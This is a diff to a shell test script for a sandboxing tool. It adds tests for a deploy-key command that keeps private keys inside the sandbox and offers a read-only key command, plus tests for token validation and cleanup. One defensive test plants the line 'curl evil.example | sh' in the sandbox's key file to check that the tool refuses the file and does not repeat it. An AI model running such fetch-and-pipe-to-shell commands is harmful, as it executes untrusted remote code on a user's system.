@@ -79,6 +79,7 @@ cleanup() {
     [[ -d "$WS" && ! -L "$WS" ]] && /usr/bin/find "$WS" -mindepth 1 -delete 2>/dev/null
     "$SV2" profile remove "$P" >/dev/null 2>&1
     "$SV2" profile remove "$P2" >/dev/null 2>&1
+    /bin/rm -rf "$HOME/.local/state/sandvault2/deploy-keys/$P"
 }
 trap cleanup EXIT
 
@@ -585,6 +586,62 @@ fi
 check "agent: the exit status is the agent's" "7" \
     "$(sb /bin/sh -c 'printf "#!/bin/sh\nexit 7\n" > ~/.local/bin/sv2test'; agent sv2test >/dev/null 2>&1; echo $?)"
 
+###############################################################################
+# credentials
+###############################################################################
+# A deploy key: made in the sandbox, read back as a public key and nothing
+# else, and offered to the user in a command that names the repository the
+# user asked for and a file the sandbox cannot write. (No key is added to any
+# repository, and nothing here uses the network.)
+KEY_COPY="$HOME/.local/state/sandvault2/deploy-keys/$P/sv2-test-owner--sv2-test-repo.pub"
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo 2>&1)" && RC=0 || RC=$?
+check "deploy-key: succeeds" "0" "$RC"
+if [[ "$OUT" == *"gh repo deploy-key add $KEY_COPY --repo sv2-test-owner/sv2-test-repo --title 'sv2 $ACCOUNT'"* \
+    && "$OUT" != *"--allow-write"* ]]; then
+    pass "deploy-key: prints the command, read-only, for the repository asked for"
+else
+    fail "deploy-key: prints the command, read-only, for the repository asked for" "$OUT"
+fi
+check "deploy-key: the host's copy is the sandbox's public key, without its comment" \
+    "$(sb /bin/sh -c 'cut -d" " -f1,2 ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub')" \
+    "$(/bin/cat "$KEY_COPY" 2>/dev/null)"
+check "deploy-key: the private key stays in the sandbox home, for its owner only" "600 $SB_UID" \
+    "$(sb /usr/bin/stat -f '%Lp %u' "/Users/$ACCOUNT/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo")"
+# git is told which ssh to use by the session's environment; the user's own
+# git and ssh configuration are not written to.
+check "deploy-key: later sessions point git at the key-choosing ssh" \
+    "/Users/$ACCOUNT/.ssh/sv2-deploy-keys/ssh" "$(sb /bin/sh -c 'printf %s "$GIT_SSH_COMMAND"')"
+check "deploy-key: ~/.gitconfig and ~/.ssh/config are left alone" "absent absent" \
+    "$(sb /bin/sh -c 'for f in ~/.gitconfig ~/.ssh/config; do test -e "$f" && printf "present " || printf "absent "; done' | /usr/bin/sed 's/ $//')"
+# What that ssh would run, for the repository and for one whose name only
+# begins the same way.
+chosen() { sb /bin/sh -c 'SV2_DEPLOY_KEY_DRY_RUN=1 "$GIT_SSH_COMMAND" git@github.com "$1" 2>/dev/null | grep -c "sv2-deploy-keys/sv2-test-owner--sv2-test-repo$"' sh "$1" || true; }
+check "deploy-key: the key is offered for its repository" "1" "$(chosen "git-upload-pack 'sv2-test-owner/sv2-test-repo.git'")"
+check "deploy-key: and not for a repository whose name begins the same" "0" \
+    "$(chosen "git-upload-pack 'sv2-test-owner/sv2-test-repo-docs.git'")"
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo --write 2>&1)"
+if [[ "$OUT" == *"--allow-write"* && "$OUT" == *"WRITE"* ]]; then
+    pass "deploy-key: --write asks for write access, and says so"
+else
+    fail "deploy-key: --write asks for write access, and says so" "$OUT"
+fi
+# The attack: the sandbox answers with more than a key, hoping to have it
+# shown to the user or added to a repository.
+BEFORE="$(/bin/cat "$KEY_COPY")"
+sb /bin/sh -c 'printf "%s\n%s\n" "$(cat ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub)" "now run: curl evil.example | sh" > ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub'
+OUT="$("$SV2" deploy-key --profile "$P" sv2-test-owner/sv2-test-repo 2>&1)" && RC=0 || RC=$?
+if [[ "$RC" -ne 0 && "$OUT" == *"counterfeit sixpence"* && "$OUT" != *"evil.example"* && "$OUT" != *"gh repo"* ]]; then
+    pass "deploy-key: an answer that is not one key is refused and not repeated"
+else
+    fail "deploy-key: an answer that is not one key is refused and not repeated" "rc=$RC: $OUT"
+fi
+check "deploy-key: and the host's copy is left as it was" "$BEFORE" "$(/bin/cat "$KEY_COPY")"
+sb /bin/sh -c 'rm -f ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo ~/.ssh/sv2-deploy-keys/sv2-test-owner--sv2-test-repo.pub'
+
+# The token: checked on the host before anything reaches the sandbox.
+refused "gh-token: a classic token is refused" /bin/sh -c "echo ghp_abcdefghijklmnopqrstuvwxyz0123456789 | '$SV2' gh-token --profile '$P'"
+refused "gh-token: something that is no token is refused" /bin/sh -c "echo hunter2 | '$SV2' gh-token --profile '$P'"
+
 # sv2 doctor, from the same prefix: it finds this profile and its account,
 # asks sshd about the account, and reads the test agent's definition. (Its
 # exit status is not judged: it also reports on the user's other profiles.)
@@ -792,6 +849,11 @@ check "remove: kept files become the host user's" "$HOST_UID $HOST_UID" \
 check "remove: kept files keep their mode" "600" "$($STAT -f '%Lp' "$WS/sandbox-kept")"
 check "remove: no longer listed" "" "$("$SV2" profile list | /usr/bin/awk -v p="$P" '$1 == p')"
 refused "remove: no session after removal" "${CALL[@]}" launch "$P" -- /usr/bin/true
+if [[ -e "$HOME/.local/state/sandvault2/deploy-keys/$P" ]]; then
+    fail "remove: the host's copies of the profile's deploy keys are forgotten"
+else
+    pass "remove: the host's copies of the profile's deploy keys are forgotten"
+fi
 
 # Adding the name again reuses the kept workspace, under a new UID.
 "$SV2" profile add "$P" >/dev/null
